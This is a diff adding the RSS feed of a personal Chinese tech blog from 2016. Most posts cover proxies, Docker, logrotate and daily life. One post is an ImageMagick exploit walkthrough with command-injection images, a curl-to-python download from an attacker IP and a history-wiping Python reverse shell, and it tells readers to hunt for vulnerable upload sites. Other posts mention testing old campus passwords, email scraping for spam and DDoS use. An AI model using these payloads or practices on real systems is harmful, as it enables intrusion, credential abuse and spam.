@@ -1,0 +1,342 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>wrfly&#39;s blog</title>
+    <link>https://wrfly.kfd.me/posts/2016/</link>
+    <description>Recent content on wrfly&#39;s blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Sat, 12 Nov 2016 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="https://wrfly.kfd.me/posts/2016/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>校园V6</title>
+      <link>https://wrfly.kfd.me/posts/%E6%A0%A1%E5%9B%ADv6/</link>
+      <pubDate>Sat, 12 Nov 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E6%A0%A1%E5%9B%ADv6/</guid>
+      <description>31-aug-2015，我注册了 xyv6.com 这个域名。我还记得那个中午。
+起因是校园网流量太少，但是学校又不限制IPv6的流量（不知道是政策上还是技术手段上），所以就萌生了用IPv6代理上网的想法。
+其实这个想法的萌芽是用GAE翻墙，然后联想到GAE的IPV6，又联想到shadowsocks，再联想到IPv6服务器。
+恰好那个时候有Github送的学生福利，买了几台DigitalOcean的机器，搭了代理。
+网站是用的现成的ss-panel,当时的界面还没有现在3.0版本好看，几乎所有的售卖ss代理都是这一套。
+后端用的是ss-multi-user版本，好像是叫这个名字，已经记不清了。
+当时就算过一笔账，一台服务器可以开1000个人用，就算只有100个VIP，一个人收他10块钱，也是1000块，1000块能买7,8台机器，利滚利。而且有的机器按年买的话非常便宜。况且当时还有DigitalOcean的100刀优惠券，无本万利的感觉。（可是到最后也没有超过80个VIP用户&amp;hellip;）
+沸沸扬扬的开张了。
+当时还在情人坑思考过怎么支付，先是用的淘宝开店，让用户拍下之后联系旺旺，大约卖了几单吧，太麻烦了，不过还是很开心的。虽然是几十块钱，但对我这种穷屌丝来说就是几个月的话费啊！
+后来觉得页面难看，就改了配色，显得不是那么难看。
+还从网上找了一个logo。哈哈哈哈。
+当时推广是在校内bbs推广的，效果还算可以，不过就是有些小白啥也不懂，很无语。
+9-17的时候，注册用户过了600。
+10-19的时候，注册用户有1978个。
+当时还增加了一些小功能，比如离线下载。用户提交一个URL，每台节点的后台都有个job去拿这个下载任务，然后利用服务器的高带宽去下载，大概迅雷也是这个套路？或者他们有更牛逼的资源吧。
+还增加了支付宝支付的接口。当时这个接口我可是研究了好几天，一点也不会PHP，因为穷，硬是做出了扫码支付。想想自己当时也是蛮牛逼的，忘记吃饭，忘记睡觉，每天都是加feature，1点之前没有睡过觉。还好当时校园网不断，要是断电断网，那我就gg了。
+每次上线一个功能，都要测试好久，改来改去的，毕竟不会PHP，当时也没系统的学习Python。好在这两门语言都很好上手，容易看懂，而且，不难。
+上线的流程是，本地测试OK了，就上传代码到远程服务器。主服务器为了稳定，都是买的高配置的，当然，也是便宜的。一开始在conoha，妈蛋把我封了，然后是z.com。（又封了）
+发邮件的时候，为了不显得那么low，我还自己设计了邮件页面，设计了slogan，还有主页的版面。
+有天我发现这个logo太平凡，好像是个国外很牛逼的视频播放网站的logo？然后当时谷歌也换新logo了，正好，这个配色很漂亮，抄了一下，就变成校园V6的logo：
+后来用户越来越多，破5000，破8000，到上个月的破1w，倒闭前的1w1。
+看起来都是数字。没有一开始那么激动了已经。
+寒假前想着在寒假里重新设计一下主页，但由于不想学习，寒假之前就把这一套弄完了，包括kf5的客服系统。
+对了，还被封过域名，把我 www.xyv6.com 封了之后，我就把主域名改成xyv6.com，好记，而且短。有时候，短未必是一件坏事哈。
+一开始调教支付宝接口的时候，各种让舍友付款，各种退款。都熄灯了还在弄这个，也是蛮有意思的。
+还曾经利用香港服务器搞过CDN，因为主站访问特别慢，就想自己做CDN加速一下，可是遇到了一些问题，比如莫名其妙登进了别人的账户，也是不容易。
+剩下的日子就比较清闲了，代码基本都搞完了，也没有啥开发任务，就是维护服务器，什么定时重启服务啊之类的，曾经想优化一下python代码，然而并没有成功。
+有些时候就是想起某个功能，就动手写。还有的时候是用户提出需求，然后我写。开发效率也是快，凌晨就能上线。
+不能说我比别人做的好吧，但至少，更人性化了。
+最后名声在外，是因为做了一个邀请的功能，真的很管用～
+对了，还有群发邮件，那次好像是有5000+的用户，然后我就群发邮件通知什么的。还有推广邮件，从学校的库子里扒拉了几千个邮箱，然后群发邮件，sendgrid真的太赞了～
+还增加了实时显示节点网速的功能，增加了一些监控，然而并没有去看监控&amp;hellip;
+好多事情都是拍脑袋想出来的，做出来了，就不再管了。就好像，github上开的那么多repo。
+每天支付宝上能有十块二十快的进账，一个月的收入也有几百块，能支付那些服务器的费用。总的来说，我也没赔。
+还有一件最重要的事，就是前期推广的时候我还印发了一千张广告，其实一千张也没有多少。有个大二的兄弟（当然，我也不认识人家），帮我发了一中午。省下的广告还在校园内到处贴，妈蛋还被一个保安拍照了，说不能贴广告，日狗。
+回首往事啊，好像也没有很多感慨。就是觉得怪可惜的。把鸡蛋放到一个篮子里，篮子摔了，鸡蛋也都碎了。
+现在也没动力去搞了，没有新的功能，没有维护，QQ群也是几天看一次，还那么多发广告的。QQ群的人数一直没破300，微博的粉丝也到了321止步。真的结束了。
+不过我很开心能做出这样一件事情，让自己没有碌碌无为，能赚些小钱充充话费，给女朋友买点东西。还学到了不少运维的经验。还用这些服务器D过别人hhhh
+自己的付出，得到了别人的感谢，真的是一件，非常非常非常快乐的事。
+向自由致敬。
+校园V6也许不会再开放了，因为我不确定还有没有这样的时间去做，我也不能说我失败了，只能说自己没有用心，或者懒惰。备份的数据放在同一台机器上，我也不知道自己是咋想的hhh。
+虽然积累的一些脚本没了，不过经验还在。我还在。
+再也不会有人注册了。
+忽然想开放源码了。
+好。就这么做了。
+ 以后数据库要异地容灾。 卖ss没有你想象中那么赚钱。 有好用户，也有坏用户。但大多都是好的。 防止薅羊毛。 得到别人的认可是很重要的。 成就感源自于*你*的成就。 很多事情没有你想象中那么难，着手去做就好了。 行动力是第一要素。  平台构架  主节点： &amp;ndash; Mysql（存储用户数据） &amp;ndash; Nginx（Web服务） &amp;ndash; Shadowsocks（运行服务，更新用户数据，更新用户套餐） &amp;ndash; Cron定时任务（月底清空免费用户流量数据，每小时备份，每天压缩备份数据[待添加：发送备份sql文件到邮箱]，定时重启ss服务）</description>
+    </item>
+    
+    <item>
+      <title>logrotate和cron</title>
+      <link>https://wrfly.kfd.me/posts/logrotate%E5%92%8Ccron/</link>
+      <pubDate>Thu, 21 Jul 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/logrotate%E5%92%8Ccron/</guid>
+      <description>来公司实习了四天了，遇到了一些大大小小的问题，写脚本遇到的就不详细说了，说一下定时任务和logrotate（日志滚转）。
+两篇文章介绍logrotate：http://articles.slicehost.com/2010/6/30/understanding-logrotate-on-ubuntu-part-1
+http://articles.slicehost.com/2010/6/30/understanding-logrotate-on-ubuntu-part-2
+说的很详细，具体文件可以参考 /etc/logrotate.d/ 目录下的内容。
+给出一个范本：
+/var/log/test/*.log { hourly rotate 4 missingok size 10M notifempty compress create } 从/var/log/test/目录下查找所有的以.log结尾的文件，每小时轮回一次，保存最近的四个，如果文件不存在也OK，限定大小是超过10M的文件，这里要注意的是，如果文件大小已经超过10M了，那下次logrotate运行的时候，就会忽略上面的hourly，直接rotate，notifempty的意思是，如果文件是空的，则不进行rotate，默认情况是进行的，可以查看man手册查阅详细的说明。压缩，并创建一个新的空文件，防止依赖日志文件的应用报错。
+还需要把logrotate放到cron.hourly目录下，这样配置的hourly才会生效。
+还要说的是，可以使用logrotate -f来强制执行轮回。
+在这里实习很好玩，真的有很多事情可以做。</description>
+    </item>
+    
+    <item>
+      <title>一点小工作</title>
+      <link>https://wrfly.kfd.me/posts/%E4%B8%80%E7%82%B9%E5%B0%8F%E5%B7%A5%E4%BD%9C/</link>
+      <pubDate>Wed, 06 Jul 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E4%B8%80%E7%82%B9%E5%B0%8F%E5%B7%A5%E4%BD%9C/</guid>
+      <description>前一段日子反代的谷歌被墙了，所以，不得不换个新的域名，而且这个域名还不能直接被打开（被确认为谷歌），所以，就耍了一点小聪明：
+valid_referers kfd.me *.kfd.me server_names ~\.google\. ~\.baidu\.; if ($invalid_referer) { rewrite ^/ http://kfd.me; } 算是做了一点小小的工作，而且还挺管用的。可惜了以前每天几千UV的日子，现在只有几十了。
+首先定义了一些Refer，然后服务其判断如果来源不是这些的话，就会返回到我的主站，不知道gov的那些爬虫会不会继续搞我，就先这样吧。
+还有一些小东西：
+sort -u -t &amp;#39;,&amp;#39; -k2,2 data 这条关于sort的命令，用来以文件的第二个字段（字段之间用‘，’分隔）排序并去重。超级好用！
+之所以会用到这条命令，是我这几天在搞一些用户名密码相关的事情，以后的日子还算清闲，没有别的事情，就研究用户名和密码了。
+还有一个小脚本，争取明天写个框架，是一个Telegram的机器人，放到VPS上，当监控来用。
+偷懒了好久，该活动活动了。</description>
+    </item>
+    
+    <item>
+      <title>从iso到docker</title>
+      <link>https://wrfly.kfd.me/posts/%E4%BB%8Eiso%E5%88%B0docker/</link>
+      <pubDate>Mon, 20 Jun 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E4%BB%8Eiso%E5%88%B0docker/</guid>
+      <description>一直想找一个从iso镜像到docker镜像的方法。
+然而，
+找不到。
+原来谷歌也有搜不到的东西啊，所以，我就写了这一篇文章。啊，也有可能是我没搜到，不代表别人搜不到。也有可能这种方法早就存在了，只是我不知道（也没人告诉我啊～）。
+啰嗦完毕。
+文件系统 Linux的文件系统比较有趣，感兴趣的话可以man hier一下，会有整个文件系统的介绍，比如/etc是配置文件目录，/dev是设备文件目录，这里需要注意的是这几个目录：
+ /proc /sys /run /dev  这几个目录都是系统启动时自动生成的，他们虽然也属于文件系统的一部分，但是他们是不确定的。也就是说，我们每次开机这些都会变。
+所以下一步打包文件系统的时候就可以无视他们。
+从虚拟机迁移所有文件 http://www.aboutdebian.com/tar-backup.htm
+先贴一个网址，这上面那介绍了怎样用tra打包文件系统。
+具体的命令上面也说的很清楚，我改了一下：
+tar -zcpf /tmp/fullbackup.tar.gz --directory=/ \ --exclude=proc --exclude=sys --exclude=dev \ --exclude=run --exclude=boot --exclude=tmp . 这样就不会包括那些没用的文件了。
+去掉boot的原因是，docker不需要boot。
+打包后的结果如下：
+其中镜像是pentesterlab的shellshock，iso文件也是二十多兆。
+docker import 把打包好的文件搞出来之后，就可以导入到docker了。
+导出的方法有很多啊，挂载一个数据卷（再从别的虚拟机导出来），如果不安装增强功能的话，如果不嫌麻烦安装了增强功能，还可以直接复制到文件夹；或者最简单的，从80端口下载下来，再或者sshfs，再或者用nc什么的，实在不行写个脚本也能传出来的。
+然后，我们得到了这个压缩包，直接导入就好了：
+然后就可以运行啦:
+或者从这个基础镜像修修改改（dockerfile），也可以直接在压缩的文件系统中修改，然后再导入一遍:
+这种方法适用于所有镜像，不过，有一个很严重的问题，就是如果镜像很大的话，push到docker hub上的时候会很慢，除了用第三方的docker registry或者自己搭建，还没想到别的方法（挂代理也是很慢……）。
+Later 以后想做一批关于web安全的docker基础镜像，或者从exploit-db上面找一些有漏洞的app，然后做成docker。
+不知道去了Daocloud有没有实习生福利，比如，账户升级为专业版？hhhh
+很有趣。</description>
+    </item>
+    
+    <item>
+      <title>DaoCloud API CLI Tool</title>
+      <link>https://wrfly.kfd.me/posts/daocloud-api-cli-tool/</link>
+      <pubDate>Sat, 21 May 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/daocloud-api-cli-tool/</guid>
+      <description>这段时间利用 DaoCloud API 写了一个CLI的工具。
+https://github.com/wrfly/docker/tree/master/daocloud_api
+代码在上面。
+拖了好久才写完，好累。。
+用shell写东西就是比较麻烦，不如Python好用。
+题外话：
+完成一件作品当然是很开心的，不过考虑到我是否能够顺利毕业，心情突然就不美丽了。
+没看书，没学Python，没学车，没练字，没跑步。
+也不知道我的时间都去哪儿了，好像每天过得恍恍惚惚的。
+好像看不到未来，是因为束缚太多吗？有时候我会想，如果毕不了业会怎样，拿不到学位证，大学四年就算白念了吗？可是让我学一些根本不感兴趣的东西，做一些完全无聊的工作，整个人都好难受。我也只能拿这些理由来敷衍自己，自欺欺人？算不算？
+不知道怎样解决这些问题，连个倾诉的人都没有。
+谁会站在你的立场为你着想呢？他们连自己都顾不过来，何谈关心别人。
+纠结，优柔寡断，这是我最大的缺点。
+哦对了，还有拖延。
+搪塞自己，说大不了不毕业，可是谁不想毕业呢，不毕业找不到工作怎么办，连自己都养活不了啊。可是强要我做哪些不喜欢的事情，还不如让我去养猪。写个毛的嗅探器，分析个毛的二进制代码，我连汇编都不会的好吗。我只想搭积木，积木用什么做的我根本不关心也不想去关心。
+人跟人也不能比。但我也不承认我比他们差啊。
+是不是每个人都活的这么累。
+我想知道未来的我有多强大。
+Dark time, and lazy day.</description>
+    </item>
+    
+    <item>
+      <title>ImageMagick漏洞利用</title>
+      <link>https://wrfly.kfd.me/posts/imagemagick%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</link>
+      <pubDate>Sat, 07 May 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/imagemagick%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</guid>
+      <description>写在最前面：关于漏洞的详细信息都在这儿： https://imagetragick.com/ 加个https我估计也是为了嘲讽，醉。
+话说我反应好慢。
+刚测试成功了就尴尬了一回。
+然后琢磨怎么getshell。
+然后。
+如下：
+测试服务器是否存在漏洞： 创建一个文件，叫他 e.png 吧：
+➜ cat e.png push graphic-context viewbox 0 0 640 480 fill &amp;#39;url(http://23.23.23.23:8000/)&amp;#39; pop graphic-context 其中23.23.23.23是你的服务器IP，然后在上面开一个迷你的web服务器：python -m SimpleHTTPServer，默认端口就是8000，如果有其他业务在8000端口跑。还请加个端口参数（python -m SimpleHTTPServer 8989），记得上面的e.png也改一下。
+在服务器上监听好了之后，就可以上传图片了，哦对了，首先做的应该是找一些能上传图片的站，比如，在线图片转换（Google Hacking）。
+其实可以在本地先测试一下：convert e.png o.jpg，如果服务器那边有访问请求（GET），那就说明你本地是存在漏洞的。
+然后如果你找到了一个可以上传图片并且可以执行代码的网站，那么恭喜你，下一步就可以测试getshell了。
+Getshell 利用执行命令这一点，可以做很多事，创建文件，删除文件，移动文件，乱七八糟，我只是利用了一个shell而已。
+➜ cat psh.png push graphic-context viewbox 0 0 640 480 fill &amp;#39;url(https://1&amp;#34;||curl -sS http://23.23.23.23:8000/e.py | python&amp;#34;)&amp;#39; pop graphic-context http://23.23.23.23:8000/e.py：
+import os,socket,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;24.24.24.24&amp;#34;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.unsetenv(&amp;#34;HISTFILE&amp;#34;);os.unsetenv(&amp;#34;HISTFILESIZE&amp;#34;);os.unsetenv(&amp;#34;HISTSIZE&amp;#34;);os.unsetenv(&amp;#34;HISTORY&amp;#34;);os.unsetenv(&amp;#34;HISTSAVE&amp;#34;);os.unsetenv(&amp;#34;HISTZONE&amp;#34;);os.unsetenv(&amp;#34;HISTLOG&amp;#34;);os.unsetenv(&amp;#34;HISTCMD&amp;#34;);os.putenv(&amp;#34;HISTFILE&amp;#34;,&amp;#34;/dev/null&amp;#34;);os.putenv(&amp;#34;HISTSIZE&amp;#34;,&amp;#34;0&amp;#34;);os.putenv(&amp;#34;HISTFILESIZE&amp;#34;,&amp;#34;0&amp;#34;);pty.spawn(&amp;#34;/bin/sh&amp;#34;);s.close() 然后要在 24.24.24.24 的 2333 端口监听反弹过来的shell：nc -lp 2333
+把这个图片文件上传，然后在 23.</description>
+    </item>
+    
+    <item>
+      <title>微容器</title>
+      <link>https://wrfly.kfd.me/posts/%E5%BE%AE%E5%AE%B9%E5%99%A8/</link>
+      <pubDate>Sun, 01 May 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%BE%AE%E5%AE%B9%E5%99%A8/</guid>
+      <description>日常唠叨 这是一篇拖了两周的博文。
+为了给实习做铺垫，我得多了解一下Docker相关的知识，两周前策划着要写国内docker服务商的对比，现在只起了个头，截了一些图，然后就写不下去了，因为要对比区别，就要压力测试，就要大把的时间，而时间这种消耗品，自己消耗的太快了，再加上自己还拖延症，又是一个烂尾工程。。。好在这一篇容易些，因为只需要花点时间搜集资料，花点时间搭建环境，花点时间测试一下就OK了，压力测试什么的最烦人了。
+不过总的体验来说，网易的蜂巢更像是一个卖VPS的，一个月28的价格也算很良心；灵雀云的话，很有微软的作风，不过微软至少每个页面都有标题，而灵雀云连页面标题都没有，该找个靠谱的前端了，还有微信绑定报错，也没人管，不过他家的镜像市场很不错，网络服务也是很给力，不管是香港服务器还是北京上海等国内服务器，速度都很给力，毕竟有亚马逊和微软合作；然后Daocloud，可以说是最docker的一家公司了，至于怎么docker了，你得试试才知道。
+然后正文开始。
+从容器说起 容器是啥？简单地说就是一个运行应用的盒子，有点类似沙盒，但是沙盒并不集成运行环境，而是依附主机的环境运行程序，给程序一块空间，让他跑。容器呢，则是集成了运行环境的一个空间，相当于在系统中新开了一块地，里面有啥？啥也没有，你得自己往里安装。
+所以容器有有点类似虚拟机的感觉，我想着也是为什么蜂巢把docker做的这么VPS。
+既然是容器，那他肯定是存放东西的，放点啥呢？放应用。
+而这应用又得分门别类的说一说，python是应用吧，ruby是应用吧，nodejs是应用吧，php是应用吧，甚至ubuntu系统都是一个应用。
+大部分的应用都是跑在系统上的，所以他们的基础镜像都是一个系统，这样一想的话，又跟虚拟机差不多了。当然，除了资源消耗。启动速度等等这些。在这里有一篇文章，说的就是关于docker的一些知识，可以花几分钟看一下，以后吹逼的时候也好有话说：https://segmentfault.com/a/1190000002734062
+微容器 顾名思义，微容器就是比一般容器小的容器，为什么比一般容器小呢？因为系统就这么大呀。
+还记得第一个docker容器，helloworld吗，那个就可以理解为一个简单的微容器，因为他小啊，而且还能输出helloworld，好像只有几K吧。
+然而ubuntu：
+REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu latest 4a2102d9faa8 4 months ago 187.9 MB 我这是四个月以前的镜像，现在升级了，估计得更大一点。
+对于服务器来说并不算什么，带宽都这么高了，分分钟就拖完了。但是对于个人来说，网速没那么快，安装升级东西很慢，测试的时候时常需要增增减减，如果要push到dockerhub上去的话，速度也是很感人的，打包的话也不是不可以啊，但是还是有点大。
+那么，就有了微容器，也可以说是一个微型的系统：
+REPOSITORY TAG IMAGE ID CREATED SIZE alpine latest 2bba2978e457 4 weeks ago 4.794 MB busybox latest 47bcc53f74dc 6 weeks ago 1.113 MB 关于busybox，维基百科上有比较详细的介绍：wikipedia - BusyBox
+还有轻量级的系统 alpine : wikipedia - 轻量级linux发行版
+简单地说，微容器就是建立在alpine等轻量级系统上的容器。
+创建一个微容器 得到一个微容器很简单，docker pull alpine就能得到了，进去之后（docker run -dti alpine ash）就是一个小型linux系统。可以用apk add来安装一些常用的软件，比如nginx，php，mysql等等。</description>
+    </item>
+    
+    <item>
+      <title>Ubuntu下更改网卡名字以及pppoe配置IPv6</title>
+      <link>https://wrfly.kfd.me/posts/ubuntu%E4%B8%8B%E6%9B%B4%E6%94%B9%E7%BD%91%E5%8D%A1%E5%90%8D%E5%AD%97%E4%BB%A5%E5%8F%8Apppoe%E9%85%8D%E7%BD%AEipv6/</link>
+      <pubDate>Wed, 27 Apr 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/ubuntu%E4%B8%8B%E6%9B%B4%E6%94%B9%E7%BD%91%E5%8D%A1%E5%90%8D%E5%AD%97%E4%BB%A5%E5%8F%8Apppoe%E9%85%8D%E7%BD%AEipv6/</guid>
+      <description>今天晚上莫名其妙解决了两个问题。
+第一个是更改Ubuntu升级到15.04之后网卡名字改变的问题，从15.04开始到16.04，网卡一直都是奇奇怪怪的名字，比如原来的eth0变成了enp1s0,wlan0变成了wpxxx(我真记不清了～)
+以前的时候找了一些方法也没有搞定，今天莫名其妙的找了一个方法，搞定了。
+配置文件事这个：/etc/udev/rules.d/10-network.rules（如果没有的话就创建一个），在里面添加如下代码：
+SUBSYSTEM==&amp;#34;net&amp;#34;, ACTION==&amp;#34;add&amp;#34;, ATTR{address}==&amp;#34;20:1a:xx:xx:xx:xx&amp;#34;, NAME=&amp;#34;eth0&amp;#34; SUBSYSTEM==&amp;#34;net&amp;#34;, ACTION==&amp;#34;add&amp;#34;, ATTR{address}==&amp;#34;70:18:xx:xx:xx:xx&amp;#34;, NAME=&amp;#34;wlan0&amp;#34; 那些xxxxxx是你网卡的MAC地址。然后重启就OK了。
+第二个是pppoe拨号的IPv6问题，以前的时候一直没搞定，今天突然发现一个文件：/etc/sysctl.d/10-ipv6-privacy.conf，是配置IPv6选择临时地址还是广播地址的，然后把里面的东西都注释掉，完美解决。
+里面的内容是这样子的：
+# IPv6 Privacy Extensions (RFC 4941) # --- # IPv6 typically uses a device&amp;#39;s MAC address when choosing an IPv6 address # to use in autoconfiguration. Privacy extensions allow using a randomly # generated IPv6 address, which increases privacy. # # Acceptable values: # 0 - don’t use privacy extensions. # 1 - generate privacy addresses # 2 - prefer privacy addresses and use them over the normal addresses.</description>
+    </item>
+    
+    <item>
+      <title>cookies-session-and-验证码</title>
+      <link>https://wrfly.kfd.me/posts/cookies-session-and-%E9%AA%8C%E8%AF%81%E7%A0%81/</link>
+      <pubDate>Wed, 13 Apr 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/cookies-session-and-%E9%AA%8C%E8%AF%81%E7%A0%81/</guid>
+      <description>概览 先来给出几个定义，什么是cookie，session 和验证码。
+Cookie:  Cookie（复数形态Cookies），中文名称为“小型文本文件”或“小甜饼”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。
+ Session(php):  一个访问者访问你的 web 网站将被分配一个唯一的 id, 就是所谓的会话 id. 这个 id 可以存储在用户端的一个 cookie 中，也可以通过 URL 进行传递.
+ 验证码：  全自动区分计算机和人类的公开图灵测试（英语：Completely Automated Public Turing test to tell Computers and Humans Apart，简称CAPTCHA），俗称验证码，是一种区分用户是计算机或人的公共全自动程序。在CAPTCHA测试中，作为服务器的计算机会自动生成一个问题由用户来解答。这个问题可以由计算机生成并评判，但是必须只有人类才能解答。由于计算机无法解答CAPTCHA的问题，所以回答出问题的用户就可以被认为是人类。
+ 简单地说, cookie和session是用来识别用户身份的数据, cookie又可以分为保存在内存中的和保存在硬盘中的cookie, 保存在内存中的cookie在标签页关闭的时候会自动销毁, 而如果设定了cookie的过期时间, 那么cookie则会保存在硬盘中一段时间. 而且在同一浏览器中, cookie是可以共享的.
+cookie的格式:
+Set-Cookie:键1=值1;键2=值2;过期时间;作用域;作用路径;[secure]
+作用域和作用路径是用来区分cookie的, 过期时间是告诉浏览器这个cookie在什么时候过期; 而 secure 标志则是当一个请求通过 SSL 或 HTTPS 创建时，包含 secure 选项的 cookie 才能被发送至服务器.
+服务器端通过用户提供的cookie确认用户身份, 这就造成一个问题, 如果我知道你的cookie, 在cookie未过期的情况下, 那么我就可以伪造你, 而且一些敏感信息如果存放在cookie里, 就有可能通过一定的技术手段得到那些敏感信息. 因为cookie的存在是单向的. 而HTTP协议又是无状态的.</description>
+    </item>
+    
+    <item>
+      <title>数字验证码识别</title>
+      <link>https://wrfly.kfd.me/posts/%E6%95%B0%E5%AD%97%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</link>
+      <pubDate>Sun, 10 Apr 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E6%95%B0%E5%AD%97%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</guid>
+      <description>昨天整理了一下校园网的密码, 由于数据库是一年前的了, 所以有些密码不能用, 为了检验那些密码是好的, 那些是坏的, 就得去自助服务那里登陆一下才能知道. 但是登陆的时候有个问题, 验证码.
+不过学校的验证码很low, 是下面这种的:
+很容易识别, 于是就研究了一下怎样用Python识别图片中的数字.
+用到的Python库 进行图像处理需要用到两个特殊的库, 第一个是PIL包下的Image模块, 第二个是进行OCR识别的pytesseract模块.
+from PIL import Image # 图片处理, 打开, 关闭, 获取像素信息 from pytesseract import * # OCR识别的库, 对应的CLI命令行为 tesseract 二值化 我们可以看到上面的验证码颜色都比较鲜艳, 虽然看起来好看, 但是对于程序来说这是没有必要且多余的, 因为程序只需要知道某个点是黑的还是白的就好. 所以首先要做的是将图片变成黑白的.
+要将一幅鲜艳的图片转换成黑白的, 还需要一点前戏, 图片灰度. 顾名思义, 就是把那些颜色都去掉, 变成灰色. 而二值化则是将灰色的点变成黑色.
+实现二值化 灰度处理 先把上面的那张1317放大看一下:
+(手动忽略那条截图时留下的细线)
+img = Image.open(&amp;#39;1317.png&amp;#39;) # 打开图片 img = img.convert(&amp;#39;L&amp;#39;) # 转换成灰度图片 img.save(&amp;#39;1317-L.png&amp;#39;) # 保存图片 查看转换的结果:
+可以看到, 那些色彩都没了, 变成了灰色的图片.
+二值化处理 接下来就是将灰色变成黑色, 也就是二值化, 不是0就是255.</description>
+    </item>
+    
+    <item>
+      <title>20160329</title>
+      <link>https://wrfly.kfd.me/posts/20160329/</link>
+      <pubDate>Tue, 29 Mar 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/20160329/</guid>
+      <description>好久没更新博客，好像整个人都很忙的样子，实际上是碌碌无为了。
+这几个月经历了很多事情，比如又分手啊，学Python啊，出去浪啊，投简历啊，面试啊，请假不成功啊，拿offer啊，校歌赛啊，还有认识了一个有趣的姑娘啊，硬盘数据全丢啊（备份盘，检查坏道的时候多加了一个参数，日），还有喝酒啊，呕吐啊，敲代码啊，学车啊，之前还有一些补考啊，作弊啊，撸串啊，乱七八糟的。
+每个词都是一个故事。
+反正没有好好学习。
+不学习就会落后，落后就要挨打。
+以前还说过要写日记什么的，不过现在看来也就是想想了，因为没时间写日记啊。不过要是问我时间都去哪儿了，我会说，无可奉告。因为我tm也不知道我的时间都去哪儿了。感觉一天天都浑浑噩噩的，好像做了好多事情可是又好像什么事都没做。
+列了一大堆任务，可脑子里还是乱乱的，可恶的拖延症啊。
+副本太多，打不过来了。
+想想我要做什么呢？
+今晚上先把VIM的翻译搞定，真的不能再拖了。
+然后我对hack的兴趣并不是那么大了，因为要学的东西还有那么多，日站这种事情还是得放到闲暇时刻去做。
+关于看书呢，kindle里面已经有好多看不完的书了，打发时间是好的，不能指望学到太多东西。
+至于Python的学习以及每天刷题，还是不做什么计划安排了，想起来就去做一道题，反正这本书摆在桌子上，是怎么也不可能忘掉的。
+还有就是想要看完那本二百多页的自底向下的计算机的书，可时还有一本计算机网络没有看完，嗯……好麻烦。
+话说我用markdown跟不用markdown也没什么太大的区别，也就是写写字，顶多贴个代码，插个图片，还有什么呢？表格？链接？能用到的也就这么多了吧。
+然后今天的任务是先把硬盘搞定，里面的文件就懒得恢复了，恢复了也没什么用，虚拟机再配置就是了，镜像也可以再下，至于海绵宝宝和雷蒙德，唔，在线看也好。
+长远目标还有把博客改改版，毕竟这个样子还是有点low。
+还有一些东西需要了解，端口复用啊，重定向啊，管道啊，动态域名解析啊，都是些零零碎碎的了。
+还得每天检查邮件，检查服务器的运行情况。对了，我可以写个脚本让服务器把监测的信息发给我嘛，就这么定了。那什么时候写呢？等我把离线下载写完？天，我还想用Python把离线下载重写一遍。
+我还想学集群管理，不过首要任务还是先学好Docker，多做几个image，push到dockerhub上，哎对了，之前不是说要做一些hack的image嘛，还得研究研究怎样把那些镜像弄成docker，关键是那些镜像都太小了，得好好琢磨琢磨。
+又乱七八糟的了。</description>
+    </item>
+    
+    <item>
+      <title>一点笔记</title>
+      <link>https://wrfly.kfd.me/posts/%E4%B8%80%E7%82%B9%E7%AC%94%E8%AE%B0/</link>
+      <pubDate>Sun, 27 Mar 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E4%B8%80%E7%82%B9%E7%AC%94%E8%AE%B0/</guid>
+      <description>文件描述符 File descriptor （之前面试的时候亮哥有问到这个问题，因为以前了解过相关的知识，所以能扯一点，不过还是说错了一部分。）
+首先说说什么是文件描述符：
+我们知道在Linux和Unix中有这样一个概念：“一切皆文件”。那么，我们的输入输出也都可以理解为文件。而且，既然是文件的话，那么就一定有一个实体，无论是真实的实体还是抽象出来的实体。
+文件描述符就是这样一种实体，它代表了对文件操作的输入和输出的抽象实体。
+然后我们再记住几个数字：
+   数字 含义     0 标准输入（stdin）   1 标准输出（stdout）   2 标准错误（stderr）    fd0就表示标准输入，fd1则是标准输出，fd2就是标准错误输出。
+那么这些文件存放在哪儿呢？ 在linux下，可以从这里找到他们：
+/proc/process_id/fd/
+做个实验： 打开一个终端，然后查看本进程的进程号： 进程号为14684，然后去寻找它的文件描述符： (注：其实可以直接进入 /proc/self/fd/目录，两者是等价的。)
+ /proc/self This directory refers to the process accessing the /proc filesystem, and is identical to the /proc directory named by the process ID of the same process.
+ 我们试着往里面写点东西： 看到了吗？ 我们写入到1里面的话都输出到了上一个终端里面。</description>
+    </item>
+    
+    <item>
+      <title>内涵图网站</title>
+      <link>https://wrfly.kfd.me/posts/%E5%86%85%E6%B6%B5%E5%9B%BE%E7%BD%91%E7%AB%99/</link>
+      <pubDate>Thu, 04 Feb 2016 00:00:00 +0000</pubDate>
+      
